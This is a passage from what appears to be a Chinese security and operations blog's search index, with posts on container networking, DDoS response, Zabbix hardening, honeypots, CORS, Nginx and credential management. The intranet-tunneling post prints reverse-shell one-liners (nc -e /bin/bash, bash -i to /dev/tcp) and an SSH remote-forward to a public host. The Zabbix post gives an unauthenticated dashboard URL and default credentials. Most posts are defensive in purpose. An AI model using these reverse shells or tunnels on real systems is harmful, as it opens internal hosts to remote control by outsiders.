title=\"两种网络插件对比\"></a>两种网络插件对比</h3><p>1、在使用overlay网络模型下，容器网络安全最大的挑战之一是出方向的访问关系无法细粒度控制。<br>如两个应用容器共用一个宿主机，出去的源IP是一样的，在硬件防火墙无法有效区分<br>2、若使用calico这样的underlay网络模型，因为容器IP地址会变化，传统的基于源地址不变的访问关系控制方式也会不可用。一种做法是ip固定，一种做法是容器漂移后动态去设置安全策略</p>\n<p>Overlay网络下，南北向流量需要做NAT，东西向走Overlay网络。Underlay网络下，容器IP对硬件网络可见，南北向直接路由可达，东西向也是走硬件网络。</p>\n","categories":["容器网络"],"tags":["容器网络"]},{"title":"内网刺探及穿透","url":"/2020/04/22/nc/","content":"<h3 id=\"反弹shell\"><a href=\"#反弹shell\" class=\"headerlink\" title=\"反弹shell\"></a>反弹shell</h3><p>内网shell反弹的本质是与公网服务器建立连接，将公网服务器传输过来的命令执行，并将结果返回。</p>\n<p>比如命令注入，不需要知道机器的<strong>账号密码</strong>，直接反弹出来</p>\n<p>虽然公司内网的机器没有暴漏给公网，但公网可以执行命令在这台机器上。前提条件：内网机器可访问互联网。<a id=\"more\"></a></p>\n<p>第一种——nc反弹shell</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">黑客机器：nc -lvp 8888</span><br><span class=\"line\">公司内网机器：nc -e /bin/bash 公网IP 8888</span><br></pre></td></tr></table></figure>\n\n<p>第二种——base反弹shell</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">黑客机器：nc -l -p 8888 -vvv</span><br><span class=\"line\">公司内网机器：bash -i &gt;&amp; /dev/tcp/云端IP/云端端口 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"SSH隧道端口转发，内网穿透\"><a href=\"#SSH隧道端口转发，内网穿透\" class=\"headerlink\" title=\"SSH隧道端口转发，内网穿透\"></a>SSH隧道端口转发，内网穿透</h3><p>SSH远程转发 -R参数，将公司内网的A机器SSH（默认22）端口映射到公网的机器2222端口上。实现在公网的机器上SSH本地的2222端口，远程控制内网的A机器。</p>\n<p>前提条件：<br>1、需要知道公司内网机器<strong>账号密码</strong>（公私钥也行）<br>2、内网机器可访问公网（可连接云端SSH端口）</p>\n<p>公司内网机器：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh -nNT -o ServerAliveInterval=60 -R 127.0.0.1:2222:127.0.0.1:22 hacker@114.115.145.114 -i /home/.ssh/id_rsa_私钥</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/SSH-%E5%85%AC%E5%8F%B8%E7%94%B5%E8%84%91.png\" alt=\"\" title=\"内网机器执行命令\"><br>外网云端机器：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh -p 2222 rhlog@localhost</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/SSH-%E9%BB%91%E5%AE%A2%E7%AB%AF.png\" alt=\"\" title=\"黑客端执行命令\"></p>\n<p>Tips：服务器访问互联网权限，不能轻易开。</p>\n<h3 id=\"frp内网穿透\"><a href=\"#frp内网穿透\" class=\"headerlink\" title=\"frp内网穿透\"></a>frp内网穿透</h3><p>目标：将公司内网机器的端口映射到公网上<br>技术：frp、lcx等<br>前提条件：内网机器可访问公网</p>\n<ul>\n<li>将内网SSH服务穿透到公网<br>实现效果：在公网敲ssh命令可以远程登录内网ip，前提是必须知道内网ip的账号/密码（不知道的话，公私钥免密登录也行）</li>\n<li>将内网WEB服务穿透到公网<br>实现效果：在公网访问内网的WEB系统</li>\n</ul>\n<h3 id=\"安全预防\"><a href=\"#安全预防\" class=\"headerlink\" title=\"安全预防\"></a>安全预防</h3><p>公司所有linux主机，/etc/hosts.deny禁止所有机器SSH，指定白名单如堡垒机IP到/etc/hosts.allow，对免密登录同样有效。</p>\n<p>如果开了互联网权限，又限制了80/443端口，依然可以反弹shell和SSH隧道转发（将云端SSH端口改为80）<br>具体参考：<a href=\"http://avfisher.win/archives/tag/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F\" title=\"安全小飞侠的窝\">渗透测试技巧之内网穿透方式与思路总结</a></p>\n","categories":["反弹shell"],"tags":["nc","SSH内网穿透"]},{"title":"DDoS攻击","url":"/2020/03/31/ddos/","content":"<ul>\n<li><a href=\"http://kb.secking.com/index/article/show/id/23.html\" title=\"DDOS攻击应急响应预案\">DDOS攻击应急响应预案</a></li>\n</ul>\n<p><img src=\"/images/DDoS.png\" alt=\"\" title=\"DDoS攻击\"></p>\n<h3 id=\"UDP攻击-将IDC的入口带宽塞满\"><a href=\"#UDP攻击-将IDC的入口带宽塞满\" class=\"headerlink\" title=\"UDP攻击,将IDC的入口带宽塞满\"></a>UDP攻击,将IDC的入口带宽塞满</h3><p>防御方法：<br>1、直接丢弃UDP流量，因为源IP随机伪造难以追查，但大多数业务IP并不提供UDP服务，直接丢弃UDP流量即可。<br>2、出口IP切换到另一个公网IP<br>3、如果攻击者比较执着，即使换了公网IP他也立刻更改攻击目标的话，最好的解决办法就是找运营商帮忙做流量清洗<br>4、推荐本地DDOS防护设备+运营商清洗服务/云清洗服务</p>\n<a id=\"more\"></a>\n<p>静态页面也不能抗D，但可以提高抗攻击能力。D的一般是IP，不是域名。<br>cdn只能加速网站静态资源，动态资源/API直接回源</p>\n<p>非网站web业务，无法接入WAF防护<br>非网站业务只支持四层负载均衡转发，不支持七层防护（如WAF和CC防护）<br>对于游戏业务和视频直播业务来说，基本是UDP协议开发的</p>\n<h3 id=\"术语\"><a href=\"#术语\" class=\"headerlink\" title=\"术语\"></a>术语</h3><p><strong>PPS攻击</strong>——入方向每秒多少个数据包（万PPS），如100wpps，包的速率(每秒的数据包个数，主要是消耗服务器，网关，路由等设备的CPU性能)。<strong>特点：量大包小</strong><br><strong>BPS攻击</strong>——入方向每秒多少比特数（Gbit/s），如100Gbps(每秒的带宽量，单位是小b，主要是消耗带宽，通常约定按bps表示强度)。<strong>特点：流量很大</strong></p>\n<p>出流量Response回包大小决定了消耗多少业务带宽，出流量突增，一般是CC攻击<br>入流量GET/POST/UDP等请求包大小、速率决定了DDoS攻击带宽，入流量突增，一般可能是流量攻击</p>\n<h3 id=\"高PPS攻击，不同于高带宽攻击\"><a href=\"#高PPS攻击，不同于高带宽攻击\" class=\"headerlink\" title=\"高PPS攻击，不同于高带宽攻击\"></a>高PPS攻击，不同于高带宽攻击</h3><p>PPS攻击会耗尽设备的资源。较BPS攻击少见些。缓解高PPS攻击需要的计算处理能力，远远超出了当前绝大多数网络设备路由或交换数据包的能力。</p>\n<h3 id=\"DDoS应急预案\"><a href=\"#DDoS应急预案\" class=\"headerlink\" title=\"DDoS应急预案\"></a>DDoS应急预案</h3><ol>\n<li>流量型(直接)—–流量未超过链路带宽—–本地清洗</li>\n<li>流量型(直接)—–流量超过链路带宽—–通知运营商清洗||临时扩容||云清洗—–本地清洗<br> 针对SYN、ACK、UDP、ICMP等类型的flood攻击：<ul>\n<li>一般情况下：本地清洗设备的防御算法都可以轻松应对。比如说首包丢弃、IP溯源等。</li>\n<li>特殊情况下：可以再此基础上增加一些限速，至少就可以保证在遭受攻击的时候保持业务基本的可用性。</li>\n<li>如果通过排查发现发生攻击源IP具有地域特征，可以根据地域进行限制(大量来自国外的攻击尤其适用)。</li>\n</ul>\n</li>\n<li>流量型(反射)—–流量未超过链路带宽—–本地清洗</li>\n<li>CC/HTTP慢速—–本地清洗—–本地清洗效果不佳后—–云清洗</li>\n</ol>\n<h3 id=\"常识\"><a href=\"#常识\" class=\"headerlink\" title=\"常识\"></a>常识</h3><p>服务器的上行带宽，出方向。<br>服务器的下行带宽，入方向。因为服务器的下行基本不限的，客户端上传文件，对服务器的带宽基本没有影响，取决于客户端本身网络的带宽。</p>\n<p>QPS是服务系统1s内接收客户端请求的一个并发处理能力。并发每秒的请求次数</p>\n<p>每个页面平均大小10+KB<br>1000~1500QPS，带宽大概100Mbps<br>3000QPS，带宽大概200Mbps<br>5000QPS，带宽大概400Mbps</p>\n<p>带宽和并发请求有关，和访问量无关<br>1万人<strong>同时在线</strong>访问你的站点，不代表带宽就很大。要看并发量，如有 1w 个并发请求，一个网页压缩后30kB左右，并发总共30 * 1w * 8 = 2.4G带宽。</p>\n","categories":["DDoS"],"tags":["DDoS"]},{"title":"流量分析","url":"/2020/03/31/liuliang/","content":"<p>机房出口的流量检测分析，鉴别攻击流量。</p>\n<h3 id=\"实际情况\"><a href=\"#实际情况\" class=\"headerlink\" title=\"实际情况\"></a>实际情况</h3><p>检索流量日志，巨量的404、构造的请求，非正常请求流量</p>\n","categories":["流量"],"tags":["流量"]},{"title":"zabbix漏洞","url":"/2020/03/31/zabbix/","content":"<h3 id=\"Zabbix（扎比克斯）\"><a href=\"#Zabbix（扎比克斯）\" class=\"headerlink\" title=\"Zabbix（扎比克斯）\"></a>Zabbix（扎比克斯）</h3><p>用来监控IDC服务器运行状态，告警<br>zabbix agent部署在所有服务器上，采集数据上报给master。zabbix的web界面是php，默认账号密码admin/zabbix<br>未授权访问漏洞：<br><a href=\"http://xxx/zabbix/zabbix.php?action=dashboard.view&amp;ddreset=1\">http://xxx/zabbix/zabbix.php?action=dashboard.view&amp;ddreset=1</a><br>攻击者可绕过登陆页面直接访问仪表板页面，即匿名访问系统/网络环境数据<a id=\"more\"></a></p>\n<h3 id=\"安全建议\"><a href=\"#安全建议\" class=\"headerlink\" title=\"安全建议\"></a>安全建议</h3><p>1、禁止Zabbix暴露在公网<br>2、zabbix的登录口令一定要复杂，立即修改默认口令或弱口令<br>3、zabbix的server和agent都不要以root启动，不要设置AllowRoot=1<br>4、禁止agent执行system.run，不要设置EnableRemoteCommands=1<br>5、经常打安全补丁，保持系统内核版本，Zabbix版本为最新</p>\n<h3 id=\"攻击事件回顾\"><a href=\"#攻击事件回顾\" class=\"headerlink\" title=\"攻击事件回顾\"></a>攻击事件回顾</h3><p>黑客通过测试环境一个后台登陆页面，通过修改XFF，绕过爆破限制得到管理员账号密码（test1/a123456）。然后在页面上传webshell探测内网，并利用默认口令（Admin/zabbix）成功登录测试环境Zabbix管理界面，该集群下约625个节点服务器。</p>\n<p>安全应急<br>1、测试环境开放公网，要经过安全测试<br>2、管理后台禁止开放公网，加强账号强度<br>3、测试/开发环境未部署HIDS，入侵检测未告警<br>4、中间件弱口令、空口令、默认口令，引入安全鉴权机制</p>\n","categories":["应急响应"],"tags":["zabbix"]},{"title":"honey","url":"/2020/03/05/honey/","content":"<p>1、蜜罐是伪装欺骗+溯源的蜜罐平台，获取威胁情报<br>2、探针和蜜罐，探针对流量牵引到蜜罐。探针部署在某个网络，开放某个服务，检测响应把流量给蜜罐。<br>3、易受攻击的网段，放探针<br>4、探针身份被黑客发现<br>5、dmz选哪个类型，建议是web，如后台、登录页。但不建议有漏洞的<br>6、agent已被攻击，优先下线agent，免得内网泄露<br>7、办公内网探针是全端口监听，办公内网可选择有缺陷的蜜罐。<br>8、APP区的探针，开启全端口监听，伪装核心系统名称<br>9、403/404达到阈值，直接联动waf拦截。<br>10、HIDS或EDR可以记录终端的一些异常行为日志，蜜罐联动其他安全产品<br>11、探针是小程序/脚本，蜜罐是容器/虚拟机系统<br>12、探针不会对原服务器有大的资源消耗<br>13、蜜罐弄巧成拙，不建议有缺陷的蜜罐公布到公网<br>14、非护网期间，不建议对公网开放蜜罐</p>\n","categories":["蜜罐"],"tags":["蜜罐"]},{"title":"浏览器同源限制，CORS实现跨域请求","url":"/2020/03/04/cors/","content":"<p>-<a href=\"https://ningyu1.github.io/site/post/92-cors-ajax/\" title=\"凝雨\">跨域踩坑经验总结（内涵：跨域知识科普）</a><br>-<a href=\"https://www.ruanyifeng.com/blog/2016/04/cors.html\" title=\"阮一峰的网络日志\">跨域资源共享 CORS 详解</a></p>\n<h3 id=\"什么情况下出现跨域\"><a href=\"#什么情况下出现跨域\" class=\"headerlink\" title=\"什么情况下出现跨域\"></a>什么情况下出现跨域</h3><p><img src=\"/images/cors.png\" alt=\"\"><br>浏览器有同源策略限制<br>前后端数据交互经常会碰到请求跨域<br>如果缺少了同源策略，浏览器很容易受到XSS、CSRF等攻击<br><strong>例外</strong><br>同源策略是浏览器需要遵循的标准，而如果是服务器向服务器的请求（后端–&gt;后端）就无需遵循同源策略<br>对于<code>&lt;a&gt;</code> <code>&lt;script&gt;</code> <code>&lt;img&gt;</code> <code>&lt;video&gt;</code> <code>&lt;link&gt;</code>这类属性带有src、href的标签，允许跨域加载</p>\n<a id=\"more\"></a>\n\n<h3 id=\"跨域请求方式\"><a href=\"#跨域请求方式\" class=\"headerlink\" title=\"跨域请求方式\"></a>跨域请求方式</h3><h4 id=\"1、JSONP（废弃）\"><a href=\"#1、JSONP（废弃）\" class=\"headerlink\" title=\"1、JSONP（废弃）\"></a>1、JSONP（废弃）</h4><p>只支持GET请求（不支持POST），安全性差，不推荐</p>\n<h4 id=\"2、CORS-W3C标准-跨域资源共享\"><a href=\"#2、CORS-W3C标准-跨域资源共享\" class=\"headerlink\" title=\"2、CORS W3C标准 跨域资源共享\"></a>2、CORS W3C标准 跨域资源共享</h4><p>CORS需要服务器设置header <code>Access-Control-Allow-Origin</code> 白名单等等，安全性高，<strong>推荐使用</strong></p>\n<ul>\n<li><p>2.1 对于简单请求：<br>浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个Origin字段。</p>\n<figure class=\"highlight http\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">GET</span> <span class=\"string\">/cors</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Origin</span>: http://www.cmft.com</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: api.cmft.com</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: en-US</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0...</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>2.2 对于复杂请求：<br>非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为”预检”请求OPTIONS</p>\n<figure class=\"highlight oxygene\"><table><tr><td class=\"code\"><pre><span class=\"line\">OPTIONS /cors HTTP/<span class=\"number\">1.1</span></span><br><span class=\"line\">Origin: http:<span class=\"comment\">//www.cmft.com</span></span><br><span class=\"line\">Access-Control-Request-<span class=\"function\"><span class=\"keyword\">Method</span>:</span> PUT</span><br><span class=\"line\">Access-Control-Request-Headers: X-Custom-Header</span><br><span class=\"line\">Host: api.cmft.com</span><br><span class=\"line\">Accept-Language: en-US</span><br><span class=\"line\">Connection: keep-alive</span><br><span class=\"line\">User-Agent: Mozilla/<span class=\"number\">5.0</span>...</span><br></pre></td></tr></table></figure>\n<p>用来询问HOST，关键字段是Origin，表示请求来自哪个源。RESPONSE只有header，没有响应包。<br>整个CORS通信过程，都是浏览器自动完成，不需要用户参与<br><img src=\"/images/response.png\" alt=\"\"></p>\n</li>\n</ul>\n<p><font color=#DC143C>【Tips】即使设置了<code>Access-Control-Allow-Origin</code>，但CORS只对浏览器起作用，对curl或postman或普通程序不起作用，都是可访问的。</font></p>\n<h4 id=\"3、Nginx反向代理\"><a href=\"#3、Nginx反向代理\" class=\"headerlink\" title=\"3、Nginx反向代理\"></a>3、Nginx反向代理</h4><p>Nginx中转服务器，用于转发请求（NG与其他服务端之间的资源请求不会有跨域限制）</p>\n<p>例如<code>www.123.com/index.html</code>需要调用<code>www.456.com/server.php</code>，可以写一个接口<code>www.123.com/api/server.php</code>，由这个接口在后端去调用<code>www.456.com/server.php</code>并拿到返回值，然后再返回给index.html。用nginx把/api路径转发到其他域名那里，相当于绕过了浏览器端，自然就不存在跨域问题。</p>\n<h3 id=\"CORS前端报错\"><a href=\"#CORS前端报错\" class=\"headerlink\" title=\"CORS前端报错\"></a>CORS前端报错</h3><p>报错一：</p>\n<figure class=\"highlight livecodeserver\"><table><tr><td class=\"code\"><pre><span class=\"line\">The <span class=\"built_in\">value</span> <span class=\"keyword\">of</span> <span class=\"keyword\">the</span> <span class=\"string\">'Access-Control-Allow-Credentials'</span> header <span class=\"keyword\">in</span> <span class=\"keyword\">the</span> response is <span class=\"string\">''</span> which must be <span class=\"string\">'true'</span> when <span class=\"keyword\">the</span> request<span class=\"string\">'s credentials mode is '</span><span class=\"built_in\">include</span><span class=\"string\">'.</span></span><br></pre></td></tr></table></figure>\n<p>解决方法：<br>因为请求头中有设置cookie，如登录认证。所以response响应头必须添加<code>Access-Control-Allow-Credentials: true</code></p>\n<p>报错二：</p>\n<figure class=\"highlight livecodeserver\"><table><tr><td class=\"code\"><pre><span class=\"line\">The <span class=\"built_in\">value</span> <span class=\"keyword\">of</span> <span class=\"keyword\">the</span> <span class=\"string\">'Access-Control-Allow-Origin'</span> header <span class=\"keyword\">in</span> <span class=\"keyword\">the</span> response must <span class=\"keyword\">not</span> be <span class=\"keyword\">the</span> wildcard <span class=\"string\">'*'</span> when <span class=\"keyword\">the</span> request<span class=\"string\">'s credentials mode is '</span><span class=\"built_in\">include</span><span class=\"string\">'.</span></span><br></pre></td></tr></table></figure>\n<p>解决方法：<br>响应头<code>Access-Control-Allow-Origin: *</code>中的*改为具体的https://域名</p>\n","categories":["CORS"],"tags":["跨域","CORS"]},{"title":"Nginx","url":"/2020/03/04/nginx/","content":"<h3 id=\"常用命令\"><a href=\"#常用命令\" class=\"headerlink\" title=\"常用命令\"></a>常用命令</h3><p><strong>启动nginx</strong>：<code>nginx</code><br><strong>关闭nginx</strong>：<code>nginx -s stop</code><br><strong>检测配置格式</strong>：<code>nginx -t</code><br><strong>重启nginx</strong>：<code>nginx -s reload</code></p>\n<p><img src=\"/images/nginx%E8%BD%AC%E5%8F%91.jpg\" alt=\"Nginx转发\"></p>\n<a id=\"more\"></a>\n<h3 id=\"upstream\"><a href=\"#upstream\" class=\"headerlink\" title=\"upstream\"></a>upstream</h3><p>后端的应用IP<br>对用户来说是透明的，没有暴漏后端请求</p>\n<h3 id=\"server\"><a href=\"#server\" class=\"headerlink\" title=\"server\"></a>server</h3><p>一个站点/域名，nginx可配置十多个域名，见上图</p>\n<h3 id=\"location\"><a href=\"#location\" class=\"headerlink\" title=\"location\"></a>location</h3><p><code>~</code>开头   表示区分大小写的正则匹配</p>\n<figure class=\"highlight crmsh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">location</span> <span class=\"title\">^~ /images</span>/ &#123;</span><br><span class=\"line\"><span class=\"comment\"># 匹配任何已/images/开头的任何查询并且停止搜索，后面的正则不会再匹配</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>~*</code>开头   表示不区分大小写的正则匹配</p>\n<figure class=\"highlight crmsh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">location</span> <span class=\"title\">~* .(gif</span>|jpg|jpeg)$ &#123;</span><br><span class=\"line\"><span class=\"comment\"># 匹配任何已.gif、.jpg 或 .jpeg 结尾的请求</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>!~</code>   区分大小写不匹配的正则<br><code>!~*</code>  不区分大小写不匹配的正则</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">localtion / &#123;</span><br><span class=\"line\">    <span class=\"comment\"># 所有请求都匹配以下规则</span></span><br><span class=\"line\">    <span class=\"comment\"># 因为所有的地址都以 / 开头，所以这条规则将匹配到所有请求</span></span><br><span class=\"line\">    <span class=\"comment\"># xxx 你的配置写在这里</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">location = / &#123;</span><br><span class=\"line\">    <span class=\"comment\"># 精确匹配 / ，后面带任何字符串的地址都不匹配这条</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">localtion /api &#123;</span><br><span class=\"line\">    <span class=\"comment\"># 匹配任何 /api 开头的URL，包括 /api 后面任意的, 比如 /api/getList</span></span><br><span class=\"line\">    <span class=\"comment\"># 匹配符合以后，还要继续往下搜索</span></span><br><span class=\"line\">    <span class=\"comment\"># 只有后面的正则表达式没有匹配到时，这一条才会采用这一条</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">localtion ~ /api/abc &#123;</span><br><span class=\"line\">    <span class=\"comment\"># 匹配任何 /api/abc 开头的URL，包括 /api/abc 后面任意的, 比如 /api/abc/getList</span></span><br><span class=\"line\">    <span class=\"comment\"># 匹配符合以后，还要继续往下搜索</span></span><br><span class=\"line\">    <span class=\"comment\"># 只有后面的正则表达式没有匹配到时，这一条才会采用这一条</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">location /cn &#123;</span><br><span class=\"line\">    <span class=\"comment\">#proxy_pass跳转，浏览器上URL不会跳转，用户感知不到</span></span><br><span class=\"line\">    <span class=\"comment\">#proxy_pass最后有斜杠，最终跳转http://heyaff.github.io/index.html</span></span><br><span class=\"line\">    <span class=\"comment\">#proxy_pass最后无斜杠，最终跳转http://heyaff.github.io/cn/index.html</span></span><br><span class=\"line\">    proxy_pass http://heyaff.github.io;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"Nginx生产环境场景\"><a href=\"#Nginx生产环境场景\" class=\"headerlink\" title=\"Nginx生产环境场景\"></a>Nginx生产环境场景</h3><p>1、静态文件（html/css/js/图片/字体等）直接在Nginx对应目录下访问<br>2、其它（api访问）代理到对应api服务的端口</p>\n","categories":["Nginx"],"tags":["nginx"]},{"title":"安全工作分工","url":"/2020/01/14/work/","content":"<h3 id=\"办公安全\"><a href=\"#办公安全\" class=\"headerlink\" title=\"办公安全\"></a>办公安全</h3><p>1、齐治堡垒机给正式员工，按部门创建跳板机，区分测试和生产。开发员工禁止通过堡垒机访问生产服务器，排障的话，由运维协助，有日志平台<br>外包使用Jumpserver</p>\n<p>2、金科办公网禁止Github访问，禁止pan、mail访问，脱离办公网由Macfee加黑名单<a id=\"more\"></a></p>\n<h3 id=\"IDC-服务器\"><a href=\"#IDC-服务器\" class=\"headerlink\" title=\"IDC/服务器\"></a>IDC/服务器</h3><p>1、申请DEV服务器、SIT服务器，必须通过立项。申请开墙，提供系统架构图</p>\n<p>2、交换机负责网络隔离，划分vlan，防火墙也是逻辑隔离，访问控制建议在防火墙上做，双向控制，虽然交换机也可以做</p>\n<p>3、金科的数据库DB的账号密码由DBA生成，发给运维，（开发人员不知道密码），加密后写入配置文件，应用程序框架读取配置文件后解密得到密码去连DB</p>\n<p>4、金科Gitlab放在生产网段，办公网可访问。导致很多测试、开发服务器开墙去访问，拉源码</p>\n<h3 id=\"主机安全\"><a href=\"#主机安全\" class=\"headerlink\" title=\"主机安全\"></a>主机安全</h3><p>1、Rapid7扫描主机漏洞，Webinspect扫描WEB漏洞，OP是合二为一，如下图<br><img src=\"/images/diting.png\" alt=\"扫描\"></p>\n<p>2、windows登陆账号分配申请人域账号为管理员，Linux登陆账号也是域账号，域账号的权限（amy/ops/root）统一由CAE获取控制，员工自行在上面申请</p>\n<p>3、访问控制</p>\n<h3 id=\"网络\"><a href=\"#网络\" class=\"headerlink\" title=\"网络\"></a>网络</h3><p>1、金科服务器默认不能访问外网，走外网必须经过DMZ，数据中心的外网由防火墙出口访问控制</p>\n<p>2、测试SIT环境，开发DEV环境，测试/开发员工可以在CAE上查询rhlog、root的密码，有时长限制和审计功能，同一时间只能锁定一个用户，生产机器的密码他们没权限查看</p>\n<p>3、外包没有CAE权限，所以外包的堡垒机没有root权限</p>\n<p>4、测试/开发员工禁止堡垒机访问任何生产服务器</p>\n<p>5、运维不负责开发测试机器，只负责交付中间件、数据库等服务</p>\n<h3 id=\"系统\"><a href=\"#系统\" class=\"headerlink\" title=\"系统\"></a>系统</h3><p>1、CAE密码管理系统，接管数据中心Linux账号、密码，脚本下发（如非标部署），不支持windows<br>2、CAE提供全网主机命令通道支持工具和脚本执行，配置文件推送。可以满足登录主机的日常部署操作使用。类似OP的追风脚本下发平台<br>3、登录齐治堡垒机操作：在浏览器中访问堡垒机URL，登陆进去选择一台跳板机，在跳板机中SSH目标机器，密码从CAE获取。不同于JumpServer直接帮你免密登录<br>4、Guacamole支持web界面管理RDP、VNC、SSH协议。GateOne只支持web界面管理SSH协议，即不支持windows系统。<br>5、配置中心禁止出现明文密码<br>6、VPN权限仅限运维中心开通，堡垒机仅限公司员工使用，禁止第三方申请</p>\n<h3 id=\"配置文件明文密码-V1-0\"><a href=\"#配置文件明文密码-V1-0\" class=\"headerlink\" title=\"配置文件明文密码 V1.0\"></a>配置文件明文密码 V1.0</h3><p>金科的数据库密码加密流程：<br>1、运维通过加密工具生成RSA密钥对，公钥共享给DBA<br>2、DBA创建数据库账号密码，用RSA公钥加密后，发给研发人员<br>3、运维人员将RSA私钥放在生产服务器中某个路径下，通知给研发人员<br>4、研发人员把密文、工具路径写入配置文件</p>\n<p>达到的效果：<br>配置文件禁止明文密码<br>开发看不到明文密码，私钥不在项目代码中，所以也无法解密<br>DB的明文密码，除了DBA没人知道（读取明文密码只在内存中）</p>\n<h3 id=\"配置文件明文密码-V1-1\"><a href=\"#配置文件明文密码-V1-1\" class=\"headerlink\" title=\"配置文件明文密码 V1.1\"></a>配置文件明文密码 V1.1</h3><p>中间过渡方案，将V1.0中的加密工具替换成KMS系统，但依然是口令硬编码</p>\n<p>1、运维在KMS控制台创建RSA密钥对，获取对应KeyID<br>2、DBA在运维平台，创建数据库账号密码<br>3、运维平台调用API，将KeyID+明文口令传递给KMS，KMS执行公钥加密后，返回口令密文<br>4、研发人员拿到KeyID+口令密文，写入配置文件<br>5、业务服务启动时，将KeyID+口令密文传递给KMS，返回明文口令在内存中<br><img src=\"/images/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%86%E7%A0%81%E5%8A%A0%E5%AF%86%E6%96%B9%E6%A1%88.png\" alt=\"口令加密方案\"></p>\n<h3 id=\"配置文件明文密码-V2-0\"><a href=\"#配置文件明文密码-V2-0\" class=\"headerlink\" title=\"配置文件明文密码 V2.0\"></a>配置文件明文密码 V2.0</h3><p>1、DBA在运维平台，创建数据库账号密码<br>2、运维平台调用CreatePWD API，将明文口令传递给密码托管系统<em>（不用返回密文）</em><br>3、密码托管系统调用KMS，保障密码安全（内部实现）<br>4、研发人员在配置文件中，<code>password=GetPWD()</code>函数<br>5、业务服务启动时，加载配置文件，从密码托管系统获取明文口令在内存中</p>\n<p>达到的效果：<br>配置文件中没有硬编码明文or密文<br>口令可定期轮换</p>\n","categories":["安全工作"],"tags":["安全分工","安全经验"]},{"title":"容器安全","url":"/2020/01/07/container/","content":"<p>-<a href=\"\"https://yeasy.gitbook.io/docker_practice/basic_concept/image\"\">Docker——从入门到实践</a><br>-<a href=\"\"http://wsfdl.com/kubernetes/2018/08/31/migrate_to_k8s_user.html\"\">业务容器化迁移</a><br><img src=\"/images/%E5%AE%89%E5%85%A8%E5%AE%B9%E5%99%A8.png\" alt=\"安全容器\"></p>\n<h3 id=\"云原生\"><a href=\"#云原生\" class=\"headerlink\" title=\"云原生\"></a>云原生</h3><p>云原生（Cloud Native）是一套技术体系和方法论。云（Cloud）表示应用程序位于云中，而不是传统的数据中心；原生（Native）表示应用程序从设计之初即考虑到云的环境，原生为云而设计，在云上以最佳状态运行，充分利用和发挥云平台的弹性和分布式优势。</p>\n<p>云原生的代表技术包括容器、服务网格（Service Mesh）、微服务（Microservice）、不可变基础设施和声明式API。<a id=\"more\"></a></p>\n<h3 id=\"镜像\"><a href=\"#镜像\" class=\"headerlink\" title=\"镜像\"></a>镜像</h3><p>镜像就是打包的、分层的文件系统，image 是二进制文件</p>\n<p>docker基础镜像：如nginx、tomcat可制作成基础镜像<br>docker系统镜像：如ubuntu、centos，跑起来就是一个精简版操作系统，俗称胖容器</p>\n<p>开发：标准镜像—构建/打包—&gt;业务镜像—PUSH—&gt;镜像仓库<br>运维：镜像仓库—-&gt;自动部署—-&gt;编排服务</p>\n<h3 id=\"容器\"><a href=\"#容器\" class=\"headerlink\" title=\"容器\"></a>容器</h3><p>镜像run起来就是一个容器，容器的实质是进程，运行在属于自己的“命名空间”，即独立的namespaces<br>一个镜像可以启动（run）N个容器<br>一台主机可以同时运行几千个Docker容器<br>通常一个业务系统应拆分成2~3个容器：数据存储容器+应用程序容器+(缓存容器)</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#从镜像仓库拉取镜像到本地</span></span><br><span class=\"line\">docker pull 镜像</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#构建镜像（也就是定制属于自己的镜像）</span></span><br><span class=\"line\"><span class=\"comment\">#在Dockerfile文件所在目录执行</span></span><br><span class=\"line\">dock build</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#有了镜像后，镜像run起来就是一个容器</span></span><br><span class=\"line\">docker run 镜像</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Kubernetes\"><a href=\"#Kubernetes\" class=\"headerlink\" 